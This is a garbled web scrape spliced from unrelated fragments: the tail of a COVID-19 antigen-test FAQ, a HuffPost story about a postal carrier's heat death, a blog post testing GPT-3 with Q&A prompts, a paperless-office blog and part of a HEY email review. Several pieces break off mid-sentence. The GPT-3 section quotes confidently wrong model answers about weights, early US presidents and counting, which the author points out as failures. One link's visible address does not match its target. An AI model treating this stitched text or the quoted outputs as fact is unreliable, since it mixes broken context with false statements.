<br> <strong>A:</strong> It’s possible that people might exhibit more risk after a false negative antigen test than after taking a PCR test and having to wait. However, this risk can be minimized by (a) educating people about sensitivity and (b) pairing the testing regime with other measures like masks and social distancing.</p>

<p><strong>Q:</strong> <em>Do antigen tests require those invasive pharyngeal swabs that go deep up your nose?</em>
<br> <strong>A:</strong> Not necessarily. While <a href="https://www.nytimes.com/2020/05/09/health/antigen-testing-fda-coronavirus.html">Quidel</a> and <a href="https://www.nytimes.com/reuters/2020/07/06/us/06reuters-health-coronavirus-becton-dickinson.html">Becton Dickinson</a> are producing pharyngeal swab antigen tests, another company called <a href="https://www.inquirer.com/news/spit-test-covid-coronavirus-orasure-fda-hiv--20200706.html">OraSure</a> is producing a saliva test. Will a saliva test be as accurate as a pharyngeal swab test? The evidence is mixed, with some studies suggesting it will be less accurate and others suggesting it will be more accurate (<a href="https://www.medrxiv.org/content/10.1101/2020.04.16.20067835v1">1</a>, <a href="https://www.medrxiv.org/content/10.1101/2020.05.26.20112565v1.full.pdf">2</a>, <a href="https://jcm.asm.org/content/jcm/55/1/226.full.pdf">3</a>).</p>

<p><strong>Q:</strong> <em>I heard that <a href="https://m.canadianinsider.com/sona-nanotech-announces-validation-results-for-its-covid-19-antigen-test">SONA</a> has an antigen test with 96% sensitivity. This sounds super promising!</em>
<br> <strong>A:</strong> This statistic is a bit misleading. The positive samples were generated in a laboratory. When antigen tests are done in real world clinical settings, the sensitivity is <a href="https://www.technologyreview.com/2020/04/24/1000486/antigen-testing-could-faster-cheaper-diagnose-covid-19-coronavirus/">lower</a>.</p>

<p><strong>Q:</strong> <em>Will we ever get a test that is both fast and sensitive?</em>
<br> <strong>A:</strong> The New York Times had a great <a href="https://www.nytimes.com/2020/07/06/health/fast-coronavirus-tests.html">article</a> last week on new types of point-of-care tests that are being developed, including <a href="https://www.medrxiv.org/content/10.1101/2020.06.13.20129841v1.full.pdf">HP-LAMP</a> and <a href="https://www.biorxiv.org/content/10.1101/2020.05.28.119131v1.full.pdf">SHINE</a>. These seem promising, although they are in an earlier stage of development than antigen tests, which already have several companies producing tests.</p>

Although the injury still bothered her, Frank had been cleared to go back to work. She was just two years away from retirement when she climbed back into her <a href="https://www.huffpost.com/topic/united-states-postal-service" target="_blank" rel="noopener noreferrer">U.S. Postal Service</a> truck on July 6, 2018.</span><span><br></span></p>        <!-- entry_paragraph_1_ad -->
    
<p><span>The temperature had topped out in the high 80s in the first days of the month, but then it shot up dramatically after the July 4 holiday, putting Southern California under an extreme heat advisory. On July 5, the highs surpassed 100 degrees.</span><span><br></span></p><p><span>Frank’s sister, Lynn Calkins, had warned her to be safe as she prepared for her first day back. “I said, ‘You’re not used to it. Just be careful,’” Calkins recalled.&nbsp;</span><span><br></span></p><p><span>The two shared a townhouse in the North Hills neighborhood, and Calkins always made sure the ice trays were filled the evening before a hot day so Frank could load up her water jug before heading out at 7:30 a.m.</span></p><p><span>Getting an early start on her Woodland Hills route only helped so much ― it was <a href="https://www.cbsnews.com/news/southern-california-heat-wave-breaks-records-in-los-angeles-today-2018-07-06/" target="_blank" rel="noopener noreferrer">closing in on 100 degrees</a> in downtown Los Angeles by late morning. By the afternoon, the weather stations in nearby Burbank and Van Nuys, in Los Angeles’ San Fernando Valley, hit 114 and 117, respectively ― the hottest temperatures <a href="https://www.washingtonpost.com/news/capital-weather-gang/wp/2018/07/06/monster-heat-dome-threatens-all-time-high-temperature-records-in-southern-california-friday/" target="_blank" rel="noopener noreferrer">ever recorded</a> there.</span></p></div><figure>
        </figure><div><p><span>Frank would have found no respite in her mail truck. Most of the Postal Service fleet is roughly three decades old and not equipped with air conditioning. The only relief is a pair of open windows and a small fan attached to the dashboard.&nbsp;</span></p><p><span>Frank struggled to keep pace. About 2 p.m., she called her supervisor to say she was falling behind and might not finish on time ― standard practice for a letter carrier who’s lagging, since managers want to avoid running into overtime.</span></p><p><span>The post office dispatched another employee to meet Frank on her route and give her a hand.</span></p><p><span>When her colleague reached her, Frank was unconscious in the driver’s seat. Paramedics recorded her death at 3:35 p.m.</span></p><h3>‘Neither Snow Nor Rain Nor Heat’</h3><p><span>Working for the Postal Service can be a </span><a href="https://theoutline.com/post/1836/the-us-postal-service-is-an-extremely-dangerous-place-to-work?zd=2&amp;zi=pdxz3eli" target="_blank" rel="noopener noreferrer"><span>surprisingly dangerous job</span></a><span>. While back sprains and dog bites are common for letter carriers, some of the greatest hazards are encapsulated in the agency’s </span><a href="https://about.usps.com/who-we-are/postal-history/mission-motto.pdf" target="_blank" rel="noopener noreferrer"><span>unofficial motto</span></a><span>: </span><em><span>Neither snow nor rain nor heat nor gloom of night stays these couriers from the swift completion of their appointed rounds.</span></em></p><p><span>An analysis of records shows the <a href="https://www.huffpost.com/topic/occupational-safety-and-health-administration" target="_blank" rel="noopener noreferrer">Occupational Safety and Health Administration</a> issued more than $1.3 million in initial fines against the Postal Service for heat hazards in eight years ― a large sum by OSHA standards. In many cases, the Postal Service managed to negotiate those fines down to a few thousand dollars each, or even to nothing at all, by agreeing to address the hazards.</span></p><p><span>But the continued accumulation of big-ticket citations for repeat violations shows the Postal Service hasn’t fixed its problem. OSHA files share common themes: carriers toiling inside hot vehicles, feeling pressured to complete their routes on time, and returning to work in dangerously hot weather without being </span><a href="https://www.cdc.gov/niosh/topics/heatstress/acclima.html" target="_blank" rel="noopener noreferrer"><span>acclimatized</span></a><span>. They also show postal officials pointing to the agency’s troubled finances in pleas to reduce fines while working to limit the legal scope of agreements to protect employees.</span></p><p><span>After Missouri letter carrier John Watzlawick died of hyperthermia in 2012, OSHA cited the Postal Service for willfully violating safety law and issued a fine of $70,000. The Postal Service agreed to implement new safeguards in 2014 to settle the case, but Watzlawick’s widow, Kay, has watched with dismay as the citations have continued.</span></p><p><span>“I want something done,” she told HuffPost.</span></p><p><span>An analysis by the Center for Public Integrity last year found that the Postal Service had </span><a href="https://publicintegrity.org/inequality-poverty-opportunity/workers-rights/worker-health-and-safety/extreme-heat-post-worker-health/" target="_blank" rel="noopener noreferrer"><span>exposed about 900 workers</span></a><span> to heat hazards since 2012, leading to muscle cramps, vomiting and loss of consciousness. Close to 100 workers had been hospitalized for heat-related illnesses since 2015, the site reported. Because the hospitalizations are self-reported by employers, the full tally over that span is likely higher and wouldn’t reflect the times when workers got sick but didn’t end up in the hospital.</span></p><p><span>Of at least four carriers whose deaths since 2012 involved heat, three had recently returned to work from a long absence. Occupational health experts say it’s critical that workers who have been off the job are eased back into their roles over the course of several days so that their bodies have time to readjust to high temperatures.</span></p></div><figure>
        </figure><div><p><span>Debbie Berkowitz, who worked as a chief of staff and senior adviser at OSHA and is now a safety expert at the </span><a href="https://www.nelp.org/" target="_blank" rel="noopener noreferrer"><span>National Employment Law Project</span></a><span>, said these large penalties are rare. “These are fines given to companies where OSHA has really solid evidence that they knew about the hazard and they still haven’t abated the conditions,” said Berkowitz. “I think getting the mail to customers is such a big priority that they have overlooked protecting their workers ― and overlooked it repeatedly.”</span></p><p><span>The Postal Service’s sprawling workforce includes about&nbsp;</span><a href="https://www.bls.gov/oes/2018/may/oes435052.htm" target="_blank" rel="noopener noreferrer"><span>340,000 letter carriers</span></a><span>, and whatever the weather may bring, Americans expect their mail six days a week. Though the agency declined&nbsp;</span><span>to make an official available for an interview on the subject, a spokesperson said the USPS formalized a heat illness prevention program in 2018, drawing on protocols that were already in place, and that employee safety is a “top priority.”&nbsp;</span><span>In regular meetings, workers are reminded to stay hydrated, wear cool clothing, find shade if necessary and call 911 if they start to experience heat exhaustion or heat stroke.</span></p><p><span>The spokesperson said supervisors provide mandatory training on the signs of heat illness and make sure </span><span>workers “have the resources needed to do their jobs safely.” </span></p><p><span>But the challenges will only become greater as heat records continue to be broken due to global warming.&nbsp;</span>The Los Angeles Daily News, which covered Frank’s death closely, reported that <a href="https://www.dailynews.com/2019/08/19/heres-what-woodland-hills-mail-carriers-say-is-different-at-the-post-office-after-peggy-franks-death-a-year-ago-in-extreme-heat/" target="_blank" rel="noopener noreferrer">another carrier</a> from the same post office was hospitalized for heat illness a year ago, on a day when the temperature hit 100.</p><h3>Climate Change Is Making Hot Days Hotter</h3><p><span>Postal workers make for a disturbing case study in the evolving dangers of outdoor work. Anyone who does a physical job exposed to the elements will face greater hazards <a href="https://www.huffpost.com/impact/topic/climate-change" target="_blank" rel="noopener noreferrer">as the climate changes</a>. And many workers, such as roofers, farmworkers and landscapers, are doing strenuous jobs without the union protections that postal employees have, making them more reluctant to speak up.</span></p><p><span>“As a rule of thumb, if we fail to act to reduce carbon emissions, then by midcentury a typical summer day will be as hot as the hottest single day of summer is today,” said Michael Mann, a climatologist who directs the </span><a href="http://www.essc.psu.edu/" target="_blank" rel="noopener noreferrer"><span>Earth System Science Center</span></a><span> at Pennsylvania State University.</span></p><p><span>“And the hottest day of summer? There is simply no analog in the past for what that will look like.”</span></p><p><em>BELOW: The number of extremely hot days each summer will increase significantly due to global warming.</em></p></div><figure>
        </figure><div><p><span>In some respects, that disturbing future has already arrived. The year 2019 was the </span><a href="https://www.noaa.gov/news/2019-was-2nd-hottest-year-on-record-for-earth-say-noaa-nasa" target="_blank"><span>second-hottest</span></a><span> in 140 years of National Oceanic and Atmospheric Administration records, falling behind only 2016. So far, 2020 is shaping up to be </span><a href="https://www.ncdc.noaa.gov/sotc/briefings/20200618.pdf" target="_blank" rel="noopener noreferrer"><span>even more sweltering</span></a><span> than last year. Based on temperature data through May, the NOAA says this year is “virtually certain” to crack the top five and stands a nearly 50% chance of being the hottest ever.</span></p><p><span>At HuffPost’s request, Michelle Tigchelaar, a climate scientist at Stanford University, analyzed how much more vulnerable letter carriers will be to extreme heat as global warming worsens. Factoring in clothing, work pace and access to shade, Tigchelaar’s data assumes a day in which the heat index hits 94.5 degrees Fahrenheit constitutes a danger to carriers. Her findings show that workers would face far more unsafe working days under an increase of 2 degrees Celsius (3.6 degrees Fahrenheit), let alone 4 degrees (7.2 F).</span></p><p><span>The new working environment will be much worse in the South and Midwest. For instance, a letter carrier in Detroit now faces about 10 days a year in which the heat index hits 94.5. But under a 3.6-degree F increase, that jumps to 43 days a year. Under a 7.2-degree increase, it shoots up to 79 days a year. In places like Miami, Phoenix and Houston, more than one out of every three days each year would pose a heat hazard.</span></p><p><span>There are several ways outdoor workers can mitigate heat ― working at a slower pace, taking frequent breaks, having access to air conditioning. Most of them come with a loss of productivity or some other expense. Employers will have to shift schedules around, keeping workers indoors during the hottest hours. For postal employees, that could mean delivering parcels after dark, raising other safety concerns.</span></p><p><span>And unlike, say, agricultural work, which will shift geographically as the climate changes, parcels will still need to be delivered in the most oppressively hot regions. Even though there will be fewer heat waves in mild climates like Seattle, the workers in those areas will be less physiologically prepared when the temperature does soar.</span></p><p><span>Keeping all workers safe in heat can be tricky because everybody’s resilience is different. Some workers can tolerate much more than others. For someone like Peggy Frank, there was no knowing where her limit was until she passed it.</span></p><p><em>BELOW: Letter carriers will face far more unsafe working days due to extreme heat as global warming worsens.

  <article>
    <p>I’ve been playing around with OpenAI’s new
<a href="https://arxiv.org/abs/2005.14165">GPT-3</a> language model. When I got
beta access, the first thing I wondered was, how human is GPT-3? How
close is it to passing a Turing test?</p>

<h2 id="how-it-works">How It Works</h2>

<p>Let me explain how exactly I’m generating these conversations. GPT-3
is a general language model, trained on a large amount of
uncategorized text from the internet. It isn’t
specific to a conversational format, and it isn’t trained to answer
any specific type of question. The only thing it does is, given some
text, guess what text comes next.</p>

<p>So if we want GPT-3 to generate answers to questions, we need to seed
it with a “prompt”. I’m using this prompt to initialize all of the Q&amp;A
sessions:</p>

<div><div><pre><code>Q: What is human life expectancy in the United States?
A: Human life expectancy in the United States is 78 years.

Q: Who was president of the United States in 1955?
A: Dwight D. Eisenhower was president of the United States in 1955.

Q: What party did he belong to?
A: He belonged to the Republican Party.

Q: Who was president of the United States before George W. Bush?
A: Bill Clinton was president of the United States before George W. Bush.

Q: Who won the World Series in 1995?
A: The Atlanta Braves won the World Series in 1995.
</code></pre></div></div>

<p>This is the default prompt suggested by OpenAI for Q&amp;A, so I’m not
cherrypicking it to prove anything. The point of this prompt is just
to show GPT-3 that we’re doing questions and answers, not to provide
it with information. For the prompt, both questions and answers are provided by a
human. For all the others, the answers are generated by GPT-3.</p>

<h2 id="common-sense">Common Sense</h2>

<p>Traditionally, artificial intelligence struggles at “common sense”. But
GPT-3 can answer a lot of common sense questions.</p>

<div><div><pre><code>Q: What is your favorite animal?
A: My favorite animal is a dog.

Q: Why?
A: Because dogs are loyal and friendly.

Q: What are two reasons that a dog might be in a bad mood?
A: Two reasons that a dog might be in a bad mood are if it is hungry or if it is hot.

Q: How many eyes does a giraffe have?
A: A giraffe has two eyes.

Q: How many legs does a frog have?
A: A frog has four legs.

Q: Are there any animals with three legs?
A: No, there are no animals with three legs.

Q: Why don't animals have three legs?
A: Animals don't have three legs because they would fall over.
</code></pre></div></div>

<p>Ten years ago, if I had this conversation, I would have assumed the
entity on the other end was a human. You can no longer take it for
granted that an AI does not know the answer to “common sense” questions.</p>

<p>How does GPT-3 know that a giraffe have two eyes? I wish I had some
sort of “debug output” to answer that question. I don’t know for sure,
but I can only theorize that there must be some web page in its
training data that discusses how many eyes a giraffe has. If we want
to stump GPT-3 with common sense questions, we need to think of
questions about things so mundane, they will not appear on the internet.</p>

<div><div><pre><code> Q: Which is heavier, a mouse or an elephant?
 A: An elephant is heavier than a mouse.

 Q: Which is heavier, a mouse or a toaster?
 A: A toaster is heavier than a mouse.

 Q: Which is heavier, a toaster or a pencil?
 A: A pencil is heavier than a toaster.

 Q: Which is heavier, a paper clip or a can of soda?
 A: A can of soda is heavier than a paper clip.

 Q: Which is heavier, a football player or a car?
 A: A car is heavier than a football player.
</code></pre></div></div>

<p>It’s only 4/5. We’re closer to stumping GPT-3 here. I think a human
would be pretty close to 100% on these questions. It makes sense these
are trickier - there probably isn’t any web page that compares
toasters and pencils by weight. It’s only indirectly that humans gain
this knowledge.</p>

<p>This gives us a hint for how to stump the AI more consistently. We
need to ask questions that no normal human would ever talk about.</p>

<div><div><pre><code>Q: How many eyes does a giraffe have?
A: A giraffe has two eyes.

Q: How many eyes does my foot have?
A: Your foot has two eyes.

Q: How many eyes does a spider have?
A: A spider has eight eyes.

Q: How many eyes does the sun have?
A: The sun has one eye.

Q: How many eyes does a blade of grass have?
A: A blade of grass has one eye.
</code></pre></div></div>

<p>Now we’re getting into surreal territory. GPT-3 knows how to have a
normal conversation. It doesn’t quite know how to say “Wait a
moment… your question is nonsense.” It also doesn’t know how to say
“I don’t know.”</p>

<div><div><pre><code>Q: How do you sporgle a morgle?
A: You sporgle a morgle by using a sporgle.

Q: How many bonks are in a quoit?
A: There are three bonks in a quoit.

Q: How many rainbows does it take to jump from Hawaii to seventeen?
A: It takes two rainbows to jump from Hawaii to seventeen.

Q: Which colorless green ideas sleep furiously?
A: Ideas that are colorless, green, and sleep furiously are the ideas of a sleep
furiously.

Q: Do you understand these questions?
A: I understand these questions.
</code></pre></div></div>

<p>The lesson here is that if you’re a judge in a Turing test, make sure
you ask some nonsense questions, and see if the interviewee responds
the way a human would.</p>

<h2 id="trivia-questions">Trivia Questions</h2>

<p>GPT-3 is quite good at answering questions about obscure things.</p>

<div><div><pre><code>Q: Who was president of the United States in 1801?
A: Thomas Jefferson was president of the United States in 1801.

Q: What city is in the northwest corner of Ohio?
A: Toledo is in the northwest corner of Ohio.

Q: What highway do you take to get to North Lake Tahoe from Oakland?
A: Highway 80 is the highway you take to get to North Lake Tahoe from Oakland.

Q: What are Darius's abilities in League of Legends?
A: Darius's abilities in League of Legends are: Apprehend, Decimate,
Noxian Guillotine, Crippling Strike, Apprehend, and Hemorrhage.

Q: Who did Capablanca defeat to become world chess champion?
A: Capablanca defeated Lasker to become world chess champion.
</code></pre></div></div>

<p>Oops, a repeat snuck in with question 4, but a human would make that
sort of error too. GPT-3 seems to be above
human-level on this sort of question. The tricky thing for
applications, I think, is to figure out when the answer can be relied
on. The OpenAI API does expose more data than just the text, here, so
perhaps something clever is possible.</p>

<p>In general, if you are trying to distinguish an AI from a human, you
don’t want to ask it obscure trivia questions. GPT-3 is pretty good at
a wide variety of topics.</p>

<p>One trend that continues from the common sense is that GPT-3 is
reluctant to express that it doesn’t know the answer. So invalid
questions get wrong answers.</p>

<div><div><pre><code>Q: Who was president of the United States in 1700?
A: William Penn was president of the United States in 1700.

Q: Who was president of the United States in 1650?
A: Richard Bennett was president of the United States in 1650.

Q: Who was president of the United States in 1620?
A: James I was president of the United States in 1620.

Q: Who was president of the United States in 1600?
A: Queen Elizabeth I was president of the United States in 1600.
</code></pre></div></div>

<p>These wrong answers are actually fascinating! None of these were
presidents of the United States, of course, since the US didn’t exist
then. But they are all prominent political figures who were in charge
of some US-related political entity around that time. In a sense, they
are good guesses.</p>

<div><div><pre><code>Q: Who won the World Series in 2021?
A: The New York Yankees won the World Series in 2021.

Q: Who won the World Series in 2022?
A: The New York Yankees won the World Series in 2022.

Q: Who won the World Series in 2023?
A: The New York Yankees won the World Series in 2023.
</code></pre></div></div>

<p>A bleak view of a dystopian future.</p>

<div><div><pre><code>Q: How many Super Bowls do the Cincinnati Bengals win in the 2030s?
A: The Cincinnati Bengals win two Super Bowls in the 2030s.
</code></pre></div></div>

<p>Encouraging as a Bengals fan, but perhaps not the objectively most accurate
prediction. We’ll have to wait and see.</p>

<h2 id="logic">Logic</h2>

<p>People are used to computers being superhuman at logical activities,
like playing chess or adding numbers. It might come as a surprise that
GPT-3 is not perfect at simple math questions.</p>

<div><div><pre><code>Q: When counting, what number comes before 100?
A: Ninety-nine comes before 100.

Q: When counting, what number comes before 123?
A: One hundred and twenty-two comes before 123.

Q: When counting, what number comes before 1000?
A: Nine hundred and ninety-nine comes before 1000.

Q: When counting, what number comes before 10,000?
A: Nine thousand and ninety-nine comes before 10,000.

Q: When counting, what number comes before a million?
A: Nine hundred thousand and ninety-nine comes before a million.
</code></pre></div></div>

<p>This is where the generic nature of GPT-3 comes into play. It isn’t
just the generic model, though, it’s also the architecture of neural
networks themselves. As far as I know there is no neural network that
is capable of doing basic arithmetic like addition and multiplication
on a large number of digits based on training data rather than
hardcoding.</p>

<p>It’s funny, because these operations are simple for a customized
program. But recursive logic that does some operation and repeats it
several times often doesn’t quite map onto the architecture of a
neural net well.</p>

<p>An interesting corollary is that GPT-3 often finds it easier to write
code to solve a programming problem, than to solve the problem on one
example input:</p>

<div><div><pre><code>Q: Write one line of Ruby code to reverse an array.
A: ary.reverse

Q: Write one line of Ruby code to count how many X's are in an array.
A: ary.count { |x| x == 'X' }

Q: Reverse the following array: [1, 3, 5, 6, 10, 4, 2, 77]
A: [10, 6, 4, 2, 77, 3, 5, 1]

Q: How many X's are in this array: [1, 3, 5, 6, 10, 4, 2, 77]
A: 2
</code></pre></div></div>

<p>This problem shows up in more human questions as well, if you ask
it about the result of a sequence of operations.</p>

<div><div><pre><code>Q: If I have a marble and a paper clip in a box, put a pencil in the box,
and remove the marble, what is left?
A: A paper clip.

Q: If I have two shoes in a box, put a pencil in the box, and
remove one shoe, what is left?
A: A shoe.

Q: If I put a pencil in a box, then put another pencil in the box,
what is in the box?
A: Two pencils.

Q: Then if …</code></pre></div></div></article></div></div></div></div>

July 15, 2020 | https://blog.notmyhostna.me/posts/almost-paperless-office/ | <a href="https://web.archive.org/web/*/https://blog.notmyhostna.me/posts/almost-paperless-office/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>Recently I looked at my increasingly large pile of <em>important</em> documents and decided to make sorting them a small project. After a while it was clear that a lot of them are not important enough to keep around. Invoices, warranty certificates or insurance status updates are likely not necessary to have in their original paper form.</p>
<p>Having them in a big binder makes it very hard to quickly find a document that you know you have <em>somewhere</em>.</p>
<p>The obvious solution was to look into a good setup for a paperless “office”. Before starting my research I narrowed it down to a number of features that I deemed non-negotiable:</p>
<ul>
<li>Good OCR (Text recognition)</li>
<li>Native Mac app</li>
<li>Syncing with iCloud Drive possible</li>
<li>Easy way to fulltext search through all documents</li>
<li>A way to tag and organize documents by topics or categories</li>
<li>No closed source or proprietary archiving format / container</li>
</ul>
<p>That means that at a higher level my setup consists of three parts: A scanner, software to organize documents and a shredder to destroy the documents before throwing them out.</p>
<h2 id="step-1-scanning">Step 1: Scanning</h2>
<p>I spent some time reading reviews and in the end decided on buying the <strong>Fujitsu ScanSnap iX1500</strong>. Its predecessors were well regarded and while everyone agreed that the software was not particularly beautiful it did its job well enough.</p>
<h2 id="step-2-organizing">Step 2: Organizing</h2>
<p>Even before starting this project I played around with <a href="https://c-command.com/eaglefiler/">EagleFiler</a> and enjoyed it. It’s from a reputable developer (and <a href="https://mjtsai.com/blog/">blogger</a>) who’s apps have been around for a long time.</p>
<p>EagleFiler makes having a <a href="https://c-command.com/eaglefiler/help/the-library-is-open">open format</a> a feature and not just an afterthought. This, to me, is very important for a software that should keep my documents safe and accessible for a long time.</p>
<p>As written on the <a href="https://c-command.com/eaglefiler/">website</a>:</p>
<blockquote>
<p>EagleFiler libraries use an open format: regular files and folders that are fully accessible to your other applications.</p>
</blockquote>
<p>The site has a very exhaustive help section documenting every distinct feature of the app. One relevant example: <a href="https://c-command.com/eaglefiler/help/importing-from-a-scanne">Importing from a Scanner</a></p>
<p>Right now I have the included scanner software (ScanSnap Home) set up to scan directly into a directory (<code>~/Documents/Incoming Scans</code>). ScanSnap is configured to hand over its scanned documents directly to <a href="https://www.pfu.fujitsu.com/imaging/downloads/manual/ss_webhelp/en/help/webhelp/topic/ope_appli_abbyy_detail.html">ABBYY FineReader for ScanSnap</a> which performs OCR and stores the resulting file in the mentioned <code>Incoming Scans</code> directory.</p>
<p>EagleFiler has a special watch directory called “To Import” located in its library directory (<code>~/Documents/EagleFiler Library</code> in my case) which promptly imports files thrown in there into its internal library. Unfortunately I had issues with that as then ABBYY FineReader complained that it can only work on files directly coming from ScanSnap or failed with the following obscure error message.</p>
<p><img src="https://blog.notmyhostna.me/posts/almost-paperless-office/abbyerror.png" alt="Error shown in ABBYY FineReader"></p>
<p>I contacted the — very helpful and quick to respond — ABBYY support but they said the issue isn’t known after escalating it. My guess is that this is some kind of race condition if multiple apps try to access the same file. I resolved the issue by using Hazel to monitor the “Incoming Scans” folder and moving the file to EagleFiler’s “To Import” directory once the file was processed by ABBYY FineReader and received its <code>_OCR.pdf</code> suffix.</p>
<p><img src="https://blog.notmyhostna.me/posts/almost-paperless-office/hazel.png" alt="Hazel task to moved finished documents"></p>
<p>With this glue component everything now works without a hitch and the ABBYY error message never showed up again. I was able to scan 100 documents without it showing up. In my first iteration I stored my “EagleFiler Library” directory in iCloud Drive and suspected that that’s a problem but it seems to only be related to ABBYY accessing the file at the same time. I did have some other issue with putting it in iCloud Drive but that was mostly related to ScanSnap not being able to deal with long file paths and a workaround was swiftly explained by the developer <a href="https://forum.c-command.com/t/alternative-to-to-import-folder-symlinking/12790?u=dewey">in the support forum</a>.</p>
<p>Update: In the EagleFiler 1.8.14 <a href="https://c-command.com/eaglefiler/help/version-history">Changelog</a> I spotted an interesting improvement that sounds like it’ll help with that.</p>
<blockquote>
<p>The To Import folder can now be replaced by an alias if you want to relocate it to another location (e.g. to work around a ScanSnap path length limitation).</p>
</blockquote>
<p><strong>Tagging &amp; Organizing</strong></p>
<p>This is one of the areas where I’m not completely satisfied with EagleFiler yet as the importing workflow seems unnecessarily unoptimized for an action that will be done very frequently.</p>
<p>These days I’m importing a lot of documents which don’t have metadata yet as they come — with a slight detour through the OCR app — from the scanner. They do have a filename but I want to set the “From” field (Phone Company Ltd., Insurance Company,…) and optionally tag them based on what kind of document it is (Insurance, Taxes, Invoices,…).</p>
<p>When a new file comes in I open its info panel via <code>Command + I</code> and I am presented with the following options.</p>
<p><img src="https://blog.notmyhostna.me/posts/almost-paperless-office/import.png" alt="Info panel of a document in EagleFiler"></p>
<p>It’s easy to navigate through them with the keyboard but only the “Tags” field auto completes existing tags. That means that I have to use a clipboard manager or external tool (<a href="https://forum.c-command.com/t/some-issues-and-suggestions/10513/5?u=dewey">Thread in support forum</a>) to make sure I use a consistent spelling of the source name. (Was it Telekom AG or Telekom GmbH again?). Also to reach the (for me) often used Tags field I have to hit tab 9 times to jump through the date and time fields.</p>
<p>I would love to have a kind of more “Inbox” view optimized for quick tagging similar to how the “New To-Do” modal in Things.app works. It does this exceptionally well and adding / tagging a new task is <em>fast</em>.</p>
<p><img src="https://blog.notmyhostna.me/posts/almost-paperless-office/thingsimport.png" alt="Add a new task in Things.app"></p>
<p>Another usability issue I found was tagging multiple entries. If I scan 10 related documents it would be helpful if I can just select all of them, open the Info panel and set the “From” field. This doesn’t seem to be possible right now as the field is disabled in this view.</p>
<p><img src="https://blog.notmyhostna.me/posts/almost-paperless-office/batchtagging.png" alt="Info panel of a document in EagleFiler"></p>
<p>Even with this small annoyance I’m personally happy with the solution as the search works very well and is extremely fast. Knowing that the developer is actively responding to threads in the support forum and continuously developing the app are more important to me. There’s also a lot of features that I haven’t used yet and will have to incorporate into my workflow at some point.</p>
<h2 id="step-3-destroying-the-evidedocuments">Step 3: Destroying the evide…documents</h2>
<p>Once the documents are scanned it has to be decided if it’s worth keeping the original or not. Documents where the original needs to be kept around like insurance policies, most tax documents and salary slips go back into the binder.</p>
<p>I didn’t feel comfortable with throwing my bank and some tax documents in the regular paper trash so I ordered a small document shredder. In my case that’s a <a href="https://www.leitz.com/en-nu/products/shredder-leitz-iq-home-office-p4_80090000/">Leitz IQ Home Office Document Shredder</a>. It does the job just fine, any of these will probably do.</p>
<p>Make sure you have proper backups, losing a bunch of files is sometimes easier than a big stack of paper documents.</p>

</figure></action-text-attachment><p>I've been a fanboy of DHH and Jason of <a href="https://basecamp.com/">Basecamp</a> since around 2006 when I first read <a href="https://basecamp.com/gettingreal">Getting Real</a> and started writing code in <a href="https://rubyonrails.org/">Rails</a>. We used Basecamp (and for a brief time, Highrise) as our primary communication tool for the first few years of <a href="https://freeagent.com/">FreeAgent</a> and it was a big influence from a product point of view. For the past 8 years though, I've not really used Basecamp products but I have remained a follower of the company and founders, reading their books and enjoying their Twitter rants. I'm still an ardent Rails fan as well – I rarely code at work these days so I built an app for this blog during lockdown to scratch that particular itch 👨‍💻&nbsp;</p><p>When I heard about HEY, I was immediately interested. Not because I've lost control of my inbox (I'm an order-freak and avid filterer so my inbox is generally a tranquil place), but because the HEY statement about why "Email’s a treasure" rang so true to me and because a brand-new, Rails-based, Basecamp product is always going to be pretty exciting to try.</p><p>I got my invite early and I've been kicking the tyres for a while, so I've written up a few thoughts to get them out there and to hear about what other people think.&nbsp;</p></div><div>
<p>I've been using email for 28 years. I got my first email account back in 1992 when I started university and I rarely received any email from what I can remember. I probably got the odd message from tutors, but during uni my online communication was largely centred on <a href="https://en.wikipedia.org/wiki/Internet_Relay_Chat">IRC</a>. Remember that?</p><p>On leaving university I didn't use email for a while. I got my first job via a <a href="https://en.wikipedia.org/wiki/Usenet">Usenet</a> forum so I must have used email for that, but it wasn't until the arrival of Hotmail a year or two later that I had my first 'permanent' email address and could access it anywhere (still a limited choice in 1996!). I got my first work email with my second job and then I moved on from Hotmail to Yahoo and stuck that out until 2003 when Gmail launched (and after Yahoo inexplicably deleted all my email by accident).&nbsp;</p><p>I stayed happily with Google until 2015 when I moved over to Fastmail so I could use my own domain and pay for a proper email product and not be the product myself. I still use Gmail (via G Suite) for work though.</p></div><div><p>With the arrival of HEY, I loved the privacy-first focus (no more 'spy trackers') and the new workflows (Set Aside, Focus and Reply etc) sounded great. <a href="https://www.youtube.com/watch?v=UCeYTysLyGI">Jason's demo</a> was compelling. I'm fascinated by what they've achieved with modern Rails and Javascript, the simplicity of the front-end code and speed of it all really is a triumph.&nbsp;</p><p>However once I got invited, the reality of using it has been something of a mixed bag of utter delight with some frustrations. Let's dig into it.</p></div><div>
<p><strong>Focus and Reply<br></strong>This is a headline feature and it's really very good. Flag your emails 'Reply Later' as you're reading your new mails and stack them up for dealing with later. When you're ready, Focus and Reply lets you hammer through them all at once from a single screen. It's a brilliant workflow.</p><action-text-attachment content-type="image" url="https://hey.com/assets/how-it-works/reply-mode-60e4b5c00da627a4738e055d295e13d848d4ecdd806aad1e7bbec4a8ac0d8c32.png" width="1800" height="1871"><figure>

</figure></action-text-attachment></div><p><strong>Spy Tracking</strong></p><div><p>I think the Spy Tracker support is brilliant and should become the standard in all email apps. Perhaps it will. I actually emailed Fastmail about this and their reply was pretty interesting:</p></div><blockquote>
<em>We've blocked remote images from loading by default for years: </em><a href="https://codepatterns.org/help/receive/remotecontent.html?u=90cc41d3"><em>https://www.fastmail.com/help/receive/remotecontent.html</em></a><em>.&nbsp;<p>And if you do enable remote loading of images for your known contacts, or you just enable it for a single message, then our servers proxy the images, so all the sender can know is details about our hosts and nothing about you.&nbsp;</p></em>
</blockquote><div><p>So, actually, Fastmail are pretty much doing the same thing other than alerting you to the fact that emails are using SendGrid or whatever?</p></div><p><strong>Clips</strong></p><div>

